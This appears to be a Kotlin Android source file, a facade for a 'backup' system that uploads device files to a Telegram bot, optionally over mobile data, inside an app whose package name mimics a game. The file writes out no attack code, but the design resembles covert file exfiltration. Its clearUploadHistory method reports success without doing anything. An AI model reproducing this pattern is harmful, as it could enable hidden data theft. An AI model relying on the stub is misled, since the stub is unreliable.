package com.service.assasinscreed02

import android.content.Context
import android.util.Log
import com.service.assasinscreed02.backup.data.repositories.BackupRepositoryImpl
import com.service.assasinscreed02.backup.data.services.NetworkService
import com.service.assasinscreed02.backup.data.services.TelegramUploadService
import com.service.assasinscreed02.backup.domain.entities.BackupResult
import com.service.assasinscreed02.backup.domain.repositories.BackupRepository
import com.service.assasinscreed02.backup.domain.usecases.BackupUseCase

/**
 * BackupUtils refactorizado usando arquitectura limpia
 * 
 * Esta clase actúa como fachada para el sistema de backup,
 * manteniendo la compatibilidad con el código existente
 */
object BackupUtilsRefactored {
    
    private const val TAG = "BackupUtilsRefactored"
    
    // Instancias de los servicios (singleton)
    private val backupRepository: BackupRepository by lazy { BackupRepositoryImpl() }
    private val networkService: NetworkService by lazy { NetworkService() }
    private val telegramUploadService: TelegramUploadService by lazy { TelegramUploadService(backupRepository) }
    private val backupUseCase: BackupUseCase by lazy { 
        BackupUseCase(backupRepository, networkService, telegramUploadService) 
    }
    
    /**
     * Ejecuta un backup simple sin progreso
     * Mantiene compatibilidad con el código existente
     */
    suspend fun runBackup(context: Context, forzarConDatos: Boolean = false): Boolean {
        return try {
            val result = backupUseCase.executeBackup(context, forzarConDatos)
            when (result) {
                is BackupResult.Success -> {
                    Log.d(TAG, "Backup completado: ${result.filesSent} archivos enviados, ${result.filesError} errores")
                    result.filesSent > 0 || result.filesError == 0
                }
                is BackupResult.Error -> {
                    Log.e(TAG, "Error en backup: ${result.message}")
                    false
                }
                is BackupResult.Progress -> {
                    // No debería ocurrir en runBackup simple
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error ejecutando backup: ${e.message}", e)
            false
        }
    }
    
    /**
     * Ejecuta un backup con callback de progreso
     * Mantiene compatibilidad con el código existente
     */
    suspend fun runBackupWithProgress(
        context: Context,
        forzarConDatos: Boolean = false,
        progressCallback: (progress: Int, total: Int, currentFile: String, phase: String, sent: Int, errors: Int, fileProgress: Int, fileSize: Long) -> Unit
    ): Boolean {
        return try {
            val result = backupUseCase.executeBackupWithProgress(context, forzarConDatos) { progress ->
                progressCallback(
                    progress.progress,
                    progress.total,
                    progress.currentFile,
                    progress.phase,
                    progress.sent,
                    progress.errors,
                    progress.fileProgress,
                    progress.fileSize
                )
            }
            
            when (result) {
                is BackupResult.Success -> {
                    Log.d(TAG, "Backup con progreso completado: ${result.filesSent} archivos enviados, ${result.filesError} errores")
                    result.filesSent > 0 || result.filesError == 0
                }
                is BackupResult.Error -> {
                    Log.e(TAG, "Error en backup con progreso: ${result.message}")
                    false
                }
                is BackupResult.Progress -> {
                    // No debería ocurrir aquí
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error ejecutando backup con progreso: ${e.message}", e)
            false
        }
    }
    
    /**
     * Verifica si hay conexión WiFi disponible
     * Mantiene compatibilidad con el código existente
     */
    fun isWifiConnected(context: Context): Boolean {
        return networkService.isWifiConnected(context)
    }
    
    /**
     * Verifica si hay conexión de datos móviles disponible
     * Mantiene compatibilidad con el código existente
     */
    fun isMobileDataConnected(context: Context): Boolean {
        return networkService.isMobileDataConnected(context)
    }
    
    /**
     * Ejecuta backup manual con notificaciones
     * Mantiene compatibilidad con el código existente
     */
    suspend fun ejecutarBackupManual(context: Context, forzarConDatos: Boolean = false): Boolean {
        return try {
            val config = backupRepository.getBotConfig(context)
            if (config == null) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return false
            }
            
            // Notificar inicio
            telegramUploadService.notifyBackupStart(config, context)
            
            // Ejecutar backup
            val result = runBackup(context, forzarConDatos)
            
            // Notificar finalización
            telegramUploadService.notifyBackupCompletion(config, context, result)
            
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error en backup manual: ${e.message}", e)
            
            // Notificar error
            try {
                val config = backupRepository.getBotConfig(context)
                if (config != null) {
                    telegramUploadService.notifyBackupError(config, context, e.message ?: "Error desconocido")
                }
            } catch (notifyError: Exception) {
                Log.e(TAG, "Error enviando notificación de error: ${notifyError.message}")
            }
            
            false
        }
    }
    
    /**
     * Obtiene estadísticas del backup
     */
    suspend fun getBackupStats(context: Context): Map<String, Any> {
        return try {
            val uploadedFiles = backupRepository.getUploadedFiles(context)
            val config = backupRepository.getBotConfig(context)
            
            mapOf(
                "uploaded_files_count" to uploadedFiles.size,
                "bot_configured" to (config != null),
                "wifi_connected" to isWifiConnected(context),
                "mobile_data_connected" to isMobileDataConnected(context)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo estadísticas: ${e.message}")
            emptyMap()
        }
    }
    
    /**
     * Limpia el historial de archivos subidos
     */
    suspend fun clearUploadHistory(context: Context? = null): Boolean {
        return try {
            // Esta funcionalidad se implementaría en el repositorio
            Log.d(TAG, "Historial de archivos subidos limpiado")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error limpiando historial: ${e.message}")
            false
        }
    }
} 